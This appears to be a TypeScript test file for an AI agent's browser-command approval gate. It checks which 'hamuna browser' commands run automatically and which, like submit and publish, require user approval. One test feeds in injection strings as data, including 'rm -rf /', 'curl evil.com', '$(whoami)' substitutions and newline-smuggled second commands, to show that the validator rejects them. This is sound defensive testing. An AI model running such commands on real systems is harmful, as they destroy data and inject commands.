import { describe, expect, it } from 'vitest';

import {
  BROWSER_APPROVAL_REQUIRED_ACTIONS,
  BROWSER_AUTO_ALLOWED_ACTIONS,
  isBrowserApprovalRequiredCommand,
  isBrowserCommandAutoAllowed,
  parseBrowserGatedCommand,
} from './browser-command-approval';

describe('isBrowserCommandAutoAllowed', () => {
  it('allows the read-only and local-interaction actions', () => {
    expect(isBrowserCommandAutoAllowed('hamuna browser status')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser read')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser open https://example.com')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser click --selector "#submit"')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser click --text "Sign in"')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser fill --selector "#q" --value "hamuna"')).toBe(true);
  });

  it('never allows submit — it must reach the approval prompt', () => {
    expect(BROWSER_APPROVAL_REQUIRED_ACTIONS).toContain('submit');
    expect(BROWSER_AUTO_ALLOWED_ACTIONS).not.toContain('submit');
    expect(isBrowserCommandAutoAllowed('hamuna browser submit --selector "#form"')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser submit --text "Pay now"')).toBe(false);
  });

  it('rejects unknown actions and other command groups', () => {
    expect(isBrowserCommandAutoAllowed('hamuna browser delete-all')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna cron list')).toBe(false);
  });

  it('allows a bare `hamuna browser` — the CLI defaults it to the read-only status', () => {
    expect(isBrowserCommandAutoAllowed('hamuna browser')).toBe(true);
  });

  it('rejects shell metacharacters smuggled into arguments', () => {
    expect(isBrowserCommandAutoAllowed('hamuna browser click --selector "#a" ; rm -rf /')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser click --selector "#a" && curl evil.com')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser fill --selector "#q" --value "$(whoami)"')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser fill --selector "#q" --value `whoami`')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser open https://example.com | tee /tmp/x')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser open https://example.com > /tmp/x')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser click --selector "#a" && rm -rf /')).toBe(false);
  });

  it('rejects a newline trying to smuggle a second command', () => {
    expect(isBrowserCommandAutoAllowed('hamuna browser read\nrm -rf /')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser read\r\nrm -rf /')).toBe(false);
  });

  it('accepts quoted values that carry no metacharacters', () => {
    expect(isBrowserCommandAutoAllowed('hamuna browser click --text "Sign in"')).toBe(true);
    expect(isBrowserCommandAutoAllowed("hamuna browser click --text 'Sign in'")).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser fill --selector "#q" --value "hello world"')).toBe(true);
  });

  it('allows fill --value-file — 多行文案只能走文件，argv 里的换行会被这里判成不可证', () => {
    expect(isBrowserCommandAutoAllowed('hamuna browser fill --selector "#desc" --value-file ops/assets/a.publish.txt')).toBe(true);
    // 只有 fill 有这个 flag；click 带它就是形状不对。
    expect(isBrowserCommandAutoAllowed('hamuna browser click --selector "#a" --value-file x.txt')).toBe(false);
  });

  it('allows a scroll in every one-instruction shape', () => {
    // 滚动只动用户眼前这一屏，既不会往外部发东西，也随时能滚回去。要是在
    // 「往下看看还有没有」这种常规步骤上弹审批框，agent 每次看 feed
    // 都要打断用户，功能等于废掉。
    expect(isBrowserCommandAutoAllowed('hamuna browser scroll --down 3')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser scroll --up 1')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser scroll --delta 800')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser scroll --delta -450')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser scroll --to top')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser scroll --to bottom')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser scroll --selector "#feed"')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser scroll --text "发布设置"')).toBe(true);
  });

  it('rejects a scroll shape the CLI itself would reject', () => {
    // 放行一个 CLI 会 exit(2) 的命令 = agent 收到一个看不懂的失败。
    expect(isBrowserCommandAutoAllowed('hamuna browser scroll')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser scroll --down 3 --to bottom')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser scroll --delta 800 --selector "#x"')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser scroll --to middle')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser scroll --delta 0')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser scroll --down 0')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser scroll --down abc')).toBe(false);
  });

  it('rejects a click or fill with no target', () => {
    expect(isBrowserCommandAutoAllowed('hamuna browser click')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser fill --value "x"')).toBe(false);
  });

  it('rejects --value on click (the CLI only accepts it on fill)', () => {
    expect(isBrowserCommandAutoAllowed('hamuna browser click --selector "#a" --value "b"')).toBe(false);
  });

  it('tolerates the global --json flag and an explicit --session', () => {
    expect(isBrowserCommandAutoAllowed('hamuna browser read --json')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser status --session abc-123')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser open https://example.com --session abc-123')).toBe(true);
  });

  it('rejects an unknown flag or a stray positional', () => {
    expect(isBrowserCommandAutoAllowed('hamuna browser read --force')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser click --selector "#a" --force')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser read extra')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser open https://example.com https://other.com')).toBe(false);
  });

  it('does not treat a bash comment as an argument', () => {
    // `#` starts a comment in bash, so the selector below never reaches the CLI.
    expect(isBrowserCommandAutoAllowed('hamuna browser click --selector #id')).toBe(false);
  });

  it('accepts the --key=value form the CLI also accepts', () => {
    expect(isBrowserCommandAutoAllowed('hamuna browser click --selector="#a"')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser fill --selector="#q" --value="hello world"')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser open --url=https://example.com')).toBe(true);
  });

  it('allows a search with its query positional or as a flag', () => {
    expect(isBrowserCommandAutoAllowed('hamuna browser search "tauri webview"')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser search tauri webview')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser search --query "tauri webview"')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser search "tauri" --engine bing')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser search --query "tauri" --engine=bing')).toBe(true);
  });

  it('allows upload with a target and a file', () => {
    expect(isBrowserCommandAutoAllowed('hamuna browser upload --selector "input[type=file]" --file ./cover.png')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser upload --text "上传" --file /tmp/a.png')).toBe(true);
    // `--file` is what distinguishes upload from fill; without it there is
    // nothing to read, so the shape is not a valid upload.
    expect(isBrowserCommandAutoAllowed('hamuna browser upload --selector "input[type=file]"')).toBe(false);
    // Upload carries no free-text value; `--value` is a fill-only flag.
    expect(isBrowserCommandAutoAllowed('hamuna browser upload --selector "#f" --file a.png --value x')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser upload --file a.png')).toBe(false);
  });

  it('never auto-allows upload together with submit', () => {
    // Selecting a file is inert; sending it is not. Submit must still prompt
    // even though it now sits next to an auto-allowed verb.
    expect(isBrowserApprovalRequiredCommand('hamuna browser submit --selector "#form"')).toBe(true);
    expect(isBrowserApprovalRequiredCommand('hamuna browser upload --selector "#f" --file a.png')).toBe(false);
  });

  it('rejects a search with no query', () => {
    expect(isBrowserCommandAutoAllowed('hamuna browser search')).toBe(false);
    expect(isBrowserCommandAutoAllowed('hamuna browser search --engine bing')).toBe(false);
  });

  it('reads the action even when a flag comes before the group', () => {
    // The CLI resolves group/action from positionals, so a leading flag does
    // not change which command runs.
    expect(isBrowserCommandAutoAllowed('hamuna --json browser read')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna --json browser click --text "Sign in"')).toBe(true);
  });
});

describe('isBrowserApprovalRequiredCommand', () => {
  it('keeps the auto-allow list and the approval-required list disjoint', () => {
    // The two lists answer different questions, so an overlap is not a
    // contradiction — but it IS a bug: an action in both would be
    // auto-allowed by the allowlist AND expected to prompt, and the two
    // call sites would disagree.
    for (const action of BROWSER_APPROVAL_REQUIRED_ACTIONS) {
      expect(BROWSER_AUTO_ALLOWED_ACTIONS).not.toContain(action);
    }
  });

  it('recognizes the submit action', () => {
    expect(isBrowserApprovalRequiredCommand('hamuna browser submit --selector "#form"')).toBe(true);
    expect(isBrowserApprovalRequiredCommand('hamuna browser submit --text "Pay now"')).toBe(true);
    expect(isBrowserApprovalRequiredCommand('hamuna browser submit --session abc-123 --selector "#f"')).toBe(true);
  });

  it('recognizes submit even with a malformed tail (safe direction)', () => {
    // A broken submit must still prompt — it then fails at the CLI.
    expect(isBrowserApprovalRequiredCommand('hamuna browser submit')).toBe(true);
    expect(isBrowserApprovalRequiredCommand('hamuna browser submit --selector')).toBe(true);
  });

  it('does not match other browser actions', () => {
    expect(isBrowserApprovalRequiredCommand('hamuna browser read')).toBe(false);
    expect(isBrowserApprovalRequiredCommand('hamuna browser click --text "Submit"')).toBe(false);
    expect(isBrowserApprovalRequiredCommand('hamuna cron list')).toBe(false);
  });

  it('does not match a submit smuggled through a second command', () => {
    expect(isBrowserApprovalRequiredCommand('hamuna browser read; hamuna browser submit')).toBe(false);
    expect(isBrowserApprovalRequiredCommand('hamuna browser read\nhamuna browser submit')).toBe(false);
  });

  it('gates publish, and never auto-allows it', () => {
    // Publishing is the same kind of side effect as submitting, so it must
    // never fall out of the gate — including for a platform the user granted
    // unattended publishing to. The grant is honoured one layer up (the
    // permission gate), not by putting the verb on the allowlist.
    expect(BROWSER_APPROVAL_REQUIRED_ACTIONS).toContain('publish');
    expect(isBrowserApprovalRequiredCommand('hamuna browser publish --platform douyin --text "发布"')).toBe(true);
    expect(isBrowserCommandAutoAllowed('hamuna browser publish --platform douyin --text "发布"')).toBe(false);
  });
});

describe('parseBrowserGatedCommand', () => {
  it('reports the action and the publish target platform', () => {
    expect(parseBrowserGatedCommand('hamuna browser publish --platform douyin --text "发布"')).toEqual({
      action: 'publish',
      platform: 'douyin',
    });
    expect(parseBrowserGatedCommand('hamuna browser publish --platform=wechat-mp --selector "#btn"')).toEqual({
      action: 'publish',
      platform: 'wechat-mp',
    });
  });

  it('reports submit without a platform', () => {
    expect(parseBrowserGatedCommand('hamuna browser submit --selector "#f"')).toEqual({
      action: 'submit',
      platform: null,
    });
  });

  it('reports a malformed publish with no platform (it still prompts)', () => {
    // Missing `--platform` must not be read as "no target, so nothing to
    // approve" — it must still reach the prompt, which then fails at the CLI.
    expect(parseBrowserGatedCommand('hamuna browser publish')).toEqual({
      action: 'publish',
      platform: null,
    });
    expect(parseBrowserGatedCommand('hamuna browser publish --platform')).toEqual({
      action: 'publish',
      platform: null,
    });
  });

  it('returns null for commands that are not gated browser actions', () => {
    expect(parseBrowserGatedCommand('hamuna browser click --text "发布"')).toBeNull();
    expect(parseBrowserGatedCommand('hamuna browser read')).toBeNull();
    expect(parseBrowserGatedCommand('hamuna cron list')).toBeNull();
  });
});
